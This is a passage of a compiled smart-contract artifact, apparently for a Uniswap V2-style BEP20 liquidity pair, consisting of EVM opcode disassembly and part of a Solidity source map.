PUSH1 0xB DUP1 SLOAD PUSH14 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP9 DUP2 AND SWAP2 SWAP1 SWAP2 OR PUSH14 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFF PUSH1 0x70 SHL NOT AND PUSH1 0x1 PUSH1 0x70 SHL DUP9 DUP4 AND DUP2 MUL SWAP2 SWAP1 SWAP2 OR PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH1 0x1 PUSH1 0xE0 SHL PUSH4 0xFFFFFFFF DUP8 AND MUL OR SWAP3 DUP4 SWAP1 SSTORE PUSH1 0x40 DUP1 MLOAD DUP5 DUP5 AND DUP2 MSTORE SWAP2 SWAP1 SWAP4 DIV SWAP1 SWAP2 AND PUSH1 0x20 DUP3 ADD MSTORE DUP2 MLOAD PUSH32 0x1C411E9A96E071241C2F21F7726B17AE89E3CAB4C78BE50E062B03A9FFFBBAD1 SWAP3 SWAP2 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG1 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE DUP2 MLOAD DUP6 DUP2 MSTORE SWAP2 MLOAD PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x2104 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0x2139 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD DUP6 DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP4 SWAP3 DUP8 AND SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 SWAP2 DUP3 SWAP1 SUB ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x7 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x17E7E58 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x21D4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x21E8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x21FE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0xE SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND ISZERO DUP1 ISZERO SWAP5 POP SWAP2 SWAP3 POP SWAP1 PUSH2 0x22E2 JUMPI DUP1 ISZERO PUSH2 0x22DD JUMPI PUSH1 0x0 PUSH2 0x2241 PUSH2 0xFC4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP9 DUP2 AND SWAP1 DUP9 AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x224E DUP4 PUSH2 0x22F6 JUMP JUMPDEST SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x22DA JUMPI PUSH1 0x0 PUSH2 0x2281 PUSH1 0x8 PUSH2 0xB47 PUSH2 0x2272 DUP7 DUP7 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x22B6 PUSH2 0x2299 DUP5 PUSH1 0x8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0x22AA DUP7 PUSH1 0x11 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 DUP4 DUP2 PUSH2 0x22C3 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 ISZERO PUSH2 0x22D6 JUMPI PUSH2 0x22D6 DUP8 DUP3 PUSH2 0x2348 JUMP JUMPDEST POP POP POP JUMPDEST POP POP JUMPDEST PUSH2 0x22EE JUMP JUMPDEST DUP1 ISZERO PUSH2 0x22EE JUMPI PUSH1 0x0 PUSH1 0xE SSTORE JUMPDEST POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x3 DUP3 GT ISZERO PUSH2 0x2339 JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x2 DUP3 DIV ADD JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x2333 JUMPI DUP1 SWAP2 POP PUSH1 0x2 DUP2 DUP3 DUP6 DUP2 PUSH2 0x2322 JUMPI INVALID JUMPDEST DIV ADD DUP2 PUSH2 0x232B JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x230B JUMP JUMPDEST POP PUSH2 0x2343 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x2343 JUMPI POP PUSH1 0x1 JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x235B SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x2386 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP4 MLOAD DUP6 DUP2 MSTORE SWAP4 MLOAD SWAP3 SWAP4 SWAP2 SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 LT PUSH2 0x23DB JUMPI DUP2 PUSH2 0x23DD JUMP JUMPDEST DUP3 JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x240D SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SWAP2 SWAP1 SWAP2 SSTORE SLOAD PUSH2 0x243A SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x40 DUP1 MLOAD DUP4 DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x24CD JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x42455032303A206D696E7420746F20746865207A65726F206164647265737300 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x24E0 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x250B SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP4 MLOAD DUP7 DUP2 MSTORE SWAP4 MLOAD SWAP3 SWAP4 SWAP2 SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP PUSH1 0x1 SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND PUSH1 0x1 PUSH1 0x70 SHL MUL SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP3 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB DUP5 AND DUP2 PUSH2 0x2585 JUMPI INVALID JUMPDEST DIV SWAP4 SWAP3 POP POP POP JUMP JUMPDEST DUP1 DUP3 ADD DUP3 DUP2 LT ISZERO PUSH2 0xC75 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6164642D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT INVALID POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x49 0x4E POP SSTORE SLOAD 0x5F COINBASE 0x4D 0x4F SSTORE 0x4E SLOAD SSTORE PUSH15 0x697377617056323A20494E53554646 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F 0x4D 0x49 0x4E SLOAD GASLIMIT DIFFICULTY POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F TIMESTAMP SSTORE MSTORE 0x4E GASLIMIT DIFFICULTY 0xDD CALLCODE MSTORE 0xAD SHL 0xE2 0xC8 SWAP12 PUSH10 0xC2B068FC378DAA952BA7 CALL PUSH4 0xC4A11628 CREATE2 GAS 0x4D CREATE2 0x23 0xB3 0xEF POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4F SSTORE SLOAD POP SSTORE SLOAD 0x5F COINBASE 0x4D 0x4F SSTORE 0x4E SLOAD POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F 0x4D 0x49 0x4E SLOAD GASLIMIT DIFFICULTY LOG2 PUSH6 0x627A7A723158 KECCAK256 STATICCALL 0x4B CALLDATASIZE SHR 0xDD PUSH14 0xAA0DA2A7850E0455536877912409 SDIV 0xA8 EXTCODECOPY CODECOPY 0xDD SSTORE PUSH2 0x6799 DUP15 PUSH23 0x8B64736F6C634300051000320000000000000000000000 ",
							"sourceMap": "318:18193:1:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;318:18193:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;11720:2853;;;;;;13:3:-1;8;5:12;2:2;;;30:1;27;20:12;2:2;11720:2853:1;;;;;;;;-1:-1:-1;;;;;11720:2853:1;;;;;;;;;;;;;;;;;21:11:-1;5:28;;2:2;;;46:1;43;36:12;2:2;11720:2853:1;;35:9:-1;28:4;12:14;8:25;5:40;2:2;;;58:1;55;48:12;2:2;11720:2853:1;;;;;;100:9:-1;95:1;81:12;77:20;67:8;63:35;60:50;39:11;25:12;22:29;11:107;8:2;;;131:1;128;121:12;8:2;-1:-1;11720:2853:1;;-1:-1:-1;11720:2853:1;-1:-1:-1;11720:2853:1;:::i;:::-;;217:39:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:100:-1;33:3;30:1;27:10;8:100;;;90:11;;;84:18;71:11;;;64:39;52:2;45:10;8:100;;;12:14;217:39:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1393:301:1;;;:::i;:::-;;;;-1:-1:-1;;;;;1393:301:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2852:147:0;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;2852:147:0;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;700:21:1;;;:::i;:::-;;;;-1:-1:-1;;;;;700:21:1;;;;;;;;;;;;;;2591:274;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;2591:274:1;;;;;;;;;;;;;;;;;:::i;349:26:0:-;;;:::i;:::-;;;;;;;;;;;;;;;;3150:361;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;3150:361:0;;;;;;;;;;;;;;;;;:::i;698:116::-;;;:::i;308:35::-;;;:::i;:::-;;;;;;;;;;;;;;;;;;;557:31;;;:::i;501:49::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;501:49:0;-1:-1:-1;;;;;501:49:0;;:::i;1047:32:1:-;;;:::i;1085:::-;;;:::i;5025:1265::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;5025:1265:1;-1:-1:-1;;;;;5025:1265:1;;:::i;381:44:0:-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;381:44:0;-1:-1:-1;;;;;381:44:0;;:::i;1123:17:1:-;;;:::i;820:41:0:-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;820:41:0;-1:-1:-1;;;;;820:41:0;;:::i;7789:1429:1:-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;7789:1429:1;-1:-1:-1;;;;;7789:1429:1;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;438:70;;;:::i;262:40:0:-;;;:::i;3005:139::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;3005:139:0;;;;;;;;:::i;515:48:1:-;;;:::i;17828:421::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;17828:421:1;-1:-1:-1;;;;;17828:421:1;;:::i;672:22::-;;;:::i;727:21::-;;;:::i;3517:964:0:-;;;;;;13:3:-1;8;5:12;2:2;;;30:1;27;20:12;2:2;-1:-1;;;;;;3517:964:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;6399:1281:1:-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;6399:1281:1;-1:-1:-1;;;;;6399:1281:1;;:::i;431:64:0:-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;431:64:0;;;;;;;;;;:::i;754:18:1:-;;;:::i;18295:214::-;;;:::i;11720:2853::-;1292:8;;1304:1;1292:13;1284:41;;;;;-1:-1:-1;;;1284:41:1;;;;;;;;;;;;-1:-1:-1;;;1284:41:1;;;;;;;;;;;;;;;1346:1;1335:8;:12;11884:14;;;;:32;;;11915:1;11902:10;:14;11884:32;11863:114;;;;-1:-1:-1;;;11863:114:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;11988:17;12007;12030:13;:11;:13::i;:::-;11987:56;;;;;12102:9;-1:-1:-1;;;;;12089:22:1;:10;:22;:48;;;;;12128:9;-1:-1:-1;;;;;12115:22:1;:10;:22;12089:48;12068:126;;;;;-1:-1:-1;;;12068:126:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;12205:13;;;12318:3;12313:1;12300:14;;12299:22;12286:35;;;-1:-1:-1;12335:18:1;12388:3;12383:1;12370:14;;12491:6;;12529;;12369:22;;;;12356:35;;;-1:-1:-1;;;;;;12491:6:1;;;;12529;;;12557:13;;;;;;;:30;;;12580:7;-1:-1:-1;;;;;12574:13:1;:2;-1:-1:-1;;;;;12574:13:1;;;12557:30;12549:62;;;;;-1:-1:-1;;;12549:62:1;;;;;;;;;;;;-1:-1:-1;;;12549:62:1;;;;;;;;;;;;;;;12629:14;;12625:61;;12645:41;12659:7;12668:2;12672:13;12645;:41::i;:::-;12738:14;;12734:61;;12754:41;12768:7;12777:2;12781:13;12754;:41::i;:::-;12847:15;;12843:244;;12895:2;-1:-1:-1;;;;;12880:30:1;;12932:10;12964:13;13014;13065:4;;12880:207;;;;;;;;;;;;;-1:-1:-1;;;;;12880:207:1;-1:-1:-1;;;;;12880:207:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;30:3:-1;22:6;14;1:33;99:1;93:3;85:6;81:16;74:27;137:4;133:9;126:4;121:3;117:14;113:30;106:37;;169:3;161:6;157:16;147:26;;12880:207:1;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;12880:207:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;12880:207:1;;;;12843:244;13133:3;13128:1;13115:14;;;13114:22;;;;13163:14;;;13162:22;13203:14;;13199:60;;13242:10;;13219:40;;13233:7;;-1:-1:-1;;;;;13242:10:1;13254:4;13219:13;:40::i;:::-;13311:14;;13307:60;;13350:10;;13327:40;;13341:7;;-1:-1:-1;;;;;13350:10:1;13362:4;13327:13;:40::i;:::-;13426;;;-1:-1:-1;;;13426:40:1;;13460:4;13426:40;;;;;;-1:-1:-1;;;;;13426:25:1;;;;;:40;;;;;;;;;;;;;;:25;:40;;;5:2:-1;;;;30:1;27;20:12;5:2;13426:40:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;13426:40:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;13426:40:1;13491;;;-1:-1:-1;;;13491:40:1;;13525:4;13491:40;;;;;;13426;;-1:-1:-1;;;;;;13491:25:1;;;;;:40;;;;;13426;;13491;;;;;;;;:25;:40;;;5:2:-1;;;;30:1;27;20:12;5:2;13491:40:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;13491:40:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;13491:40:1;;-1:-1:-1;13551:14:1;;-1:-1:-1;;;;;;;;;;;13579:22:1;;;;;13568:33;;:99;;13666:1;13568:99;;;13640:10;13628:9;-1:-1:-1;;;;;13628:22:1;;13616:8;:35;13568:99;13551:116;;13677:14;13717:10;13705:9;-1:-1:-1;;;;;13705:22:1;;13694:8;:33;:99;;13792:1;13694:99;;;13766:10;13754:9;-1:-1:-1;;;;;13754:22:1;;13742:8;:35;13694:99;13677:116;;13836:1;13824:9;:13;:30;;;;13853:1;13841:9;:13;13824:30;13803:111;;;;-1:-1:-1;;;13803:111:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;14014:21;14056:42;14080:17;:9;14094:2;14080:17;:13;:17;:::i;:::-;14056:19;:8;14069:5;14056:19;:12;:19;:::i;:::-;:23;:42;:23;:42;:::i;:::-;14014:98;-1:-1:-1;14126:21:1;14168:42;14192:17;:9;14206:2;14192:17;:13;:17;:::i;14168:42::-;14126:98;-1:-1:-1;14325:46:1;14360:10;14325:30;-1:-1:-1;;;;;14325:15:1;;;;:30;;;:19;:30;:::i;:::-;:34;:46;:34;:46;:::i;:::-;14263:38;:16;14284;14263:38;:20;:38;:::i;:::-;:108;;14238:177;;;;;-1:-1:-1;;;14238:177:1;;;;;;;;;;;;-1:-1:-1;;;14238:177:1;;;;;;;;;;;;;;;1357:1;;14436:49;14444:8;14454;14464:9;14475;14436:7;:49::i;:::-;14500:66;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;14500:66:1;;;14505:10;;14500:66;;;;;;;;;-1:-1:-1;;1379:1:1;1368:8;:12;-1:-1:-1;;;;;;;;;11720:2853:1:o;217:39:0:-;;;;;;;;;;;;;;-1:-1:-1;;;217:39:0;;;;:::o;1393:301:1:-;1599:8;;-1:-1:-1;;;;;1599:8:1;;;;-1:-1:-1;;;1629:8:1;;;;;;-1:-1:-1;;;1669:18:1;;;;;1393:301::o;2852:147:0:-;2919:4;2935:36;2944:10;2956:7;2965:5;2935:8;:36::i;:::-;-1:-1:-1;2988:4:0;2852:147;;;;;:::o;700:21:1:-;;;-1:-1:-1;;;;;700:21:1;;:::o;2591:274::-;2730:7;;-1:-1:-1;;;;;2730:7:1;2716:10;:21;2708:52;;;;;-1:-1:-1;;;2708:52:1;;;;;;;;;;;;-1:-1:-1;;;2708:52:1;;;;;;;;;;;;;;;2790:6;:16;;-1:-1:-1;;;;;2790:16:1;;;-1:-1:-1;;;;;;2790:16:1;;;;;;;2816:6;:16;;;;;;;;;;;;;;;2842:6;:16;2591:274::o;349:26:0:-;;;;:::o;3150:361::-;-1:-1:-1;;;;;3281:15:0;;3261:4;3281:15;;;:9;:15;;;;;;;;3297:10;3281:27;;;;;;;;-1:-1:-1;;3281:42:0;3277:171;;-1:-1:-1;;;;;3369:15:0;;;;;;:9;:15;;;;;;;;3385:10;3369:27;;;;;;;;:68;;3418:5;3369:68;:31;:68;:::i;:::-;-1:-1:-1;;;;;3339:15:0;;;;;;:9;:15;;;;;;;;3355:10;3339:27;;;;;;;:98;3277:171;3457:26;3467:4;3473:2;3477:5;3457:9;:26::i;:::-;-1:-1:-1;3500:4:0;3150:361;;;;;:::o;698:116::-;748:66;698:116;:::o;308:35::-;341:2;308:35;:::o;557:31::-;;;;:::o;501:49::-;;;;;;;;;;;;;:::o;1047:32:1:-;;;;:::o;1085:::-;;;;:::o;5025:1265::-;5074:14;1292:8;;1304:1;1292:13;1284:41;;;;;-1:-1:-1;;;1284:41:1;;;;;;;;;;;;-1:-1:-1;;;1284:41:1;;;;;;;;;;;;;;;1346:1;1335:8;:12;;;1346:1;5143:13;:11;:13::i;:::-;-1:-1:-1;5204:6:1;;5197:39;;;-1:-1:-1;;;5197:39:1;;5230:4;5197:39;;;;;;5100:56;;-1:-1:-1;5100:56:1;;-1:-1:-1;5181:13:1;;-1:-1:-1;;;;;5204:6:1;;;;5197:24;;:39;;;;;;;;;;;;;;5204:6;5197:39;;;5:2:-1;;;;30:1;27;20:12;5:2;5197:39:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;5197:39:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;5197:39:1;5269:6;;5262:39;;;-1:-1:-1;;;5262:39:1;;5295:4;5262:39;;;;;;5197;;-1:-1:-1;5246:13:1;;-1:-1:-1;;;;;5269:6:1;;;;5262:24;;:39;;;;;5197;;5262;;;;;;;;5269:6;5262:39;;;5:2:-1;;;;30:1;27;20:12;5:2;5262:39:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;5262:39:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;5262:39:1;;-1:-1:-1;5311:12:1;5326:23;:8;-1:-1:-1;;;;;5326:23:1;;;:12;:23;:::i;:::-;5311:38;-1:-1:-1;5359:12:1;5374:23;:8;-1:-1:-1;;;;;5374:23:1;;;:12;:23;:::i;:::-;5359:38;;5408:10;5421:30;5430:9;5441;5421:8;:30::i;:::-;5461:17;5481:11;5408:43;;-1:-1:-1;5584:17:1;5580:394;;5629:54;556:7;5629:31;5639:20;:7;5651;5639:20;:11;:20;:::i;:::-;5629:9;:31::i;:54::-;5617:66;;5697:36;5711:1;556:7;5697:5;:36::i;:::-;5580:394;;;5831:132;-1:-1:-1;;;;;5857:37:1;;:25;:7;5869:12;5857:25;:11;:25;:::i;:::-;:37;;;;;;-1:-1:-1;;;;;5912:37:1;;:25;:7;5924:12;5912:25;:11;:25;:::i;:::-;:37;;;;;;5831:8;:132::i;:::-;5819:144;;5580:394;6003:1;5991:9;:13;5983:64;;;;-1:-1:-1;;;5983:64:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;6057:20;6063:2;6067:9;6057:5;:20::i;:::-;6088:49;6096:8;6106;6116:9;6127;6088:7;:49::i;:::-;6151:5;6147:47;;;6185:8;;6166:28;;-1:-1:-1;;;;;6171:8:1;;;;-1:-1:-1;;;6185:8:1;;;6166:28;:18;:28;:::i;:::-;6158:5;:36;6147:47;6249:34;;;;;;;;;;;;;;6254:10;;6249:34;;;;;;;;-1:-1:-1;;1379:1:1;1368:8;:12;-1:-1:-1;5025:1265:1;;;-1:-1:-1;;;;;;5025:1265:1:o;381:44:0:-;;;;;;;;;;;;;:::o;1123:17:1:-;;;;:::o;820:41:0:-;;;;;;;;;;;;;:::o;7789:1429:1:-;7852:12;7866;1292:8;;1304:1;1292:13;1284:41;;;;;-